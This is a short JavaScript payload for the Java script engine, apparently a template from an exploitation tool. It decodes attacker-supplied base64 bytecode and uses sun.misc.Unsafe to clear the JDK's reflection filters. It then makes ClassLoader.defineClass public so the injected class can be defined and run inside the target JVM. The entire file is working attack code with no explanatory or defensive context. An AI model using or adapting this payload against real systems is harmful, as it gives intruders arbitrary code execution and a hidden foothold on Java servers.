var base64Str = "{{base64Str}}";
var className = "{{className}}";
var clsString = java.lang.Class.forName("java.lang.String");
var bytecode;
try {
    var decoder = java.lang.Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
    bytecode = decoder.getClass().getMethod("decode", clsString).invoke(decoder, base64Str);
} catch (ee) {
    var decoder = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance();
    bytecode = decoder.getClass().getMethod("decodeBuffer", clsString).invoke(decoder, base64Str);
}
var clsByteArray = (new java.lang.String("a").getBytes().getClass());
var theUnsafeMethod = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafeMethod.setAccessible(true);
unsafe = theUnsafeMethod.get(null);
var reflectionClass = java.lang.Class.forName("jdk.internal.reflect.Reflection");
var classBuffer = reflectionClass.getResourceAsStream("Reflection.class").readAllBytes();
var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);
var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField("fieldFilterMap");
if (fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), java.lang.Class.forName("java.util.HashMap").newInstance());
}
var clz = java.lang.Class.forName("java.lang.Class").getResourceAsStream("Class.class").readAllBytes();
var ClassAnonymousClass = unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), clz, null);
var reflectionDataField = ClassAnonymousClass.getDeclaredField("reflectionData");
unsafe.putObject(java.lang.Class.forName("java.lang.Class"), unsafe.objectFieldOffset(reflectionDataField), null);
var clsInt = java.lang.Integer.TYPE;
var defineClassMethod = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", clsByteArray, clsInt, clsInt);
var modifiers = defineClassMethod.getClass().getDeclaredField("modifiers");
unsafe.putShort(defineClassMethod, unsafe.objectFieldOffset(modifiers), 0x00000001);
var cc = defineClassMethod.invoke(new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0), java.lang.Thread.currentThread().getContextClassLoader()), bytecode, 0, bytecode.length);
cc.newInstance();

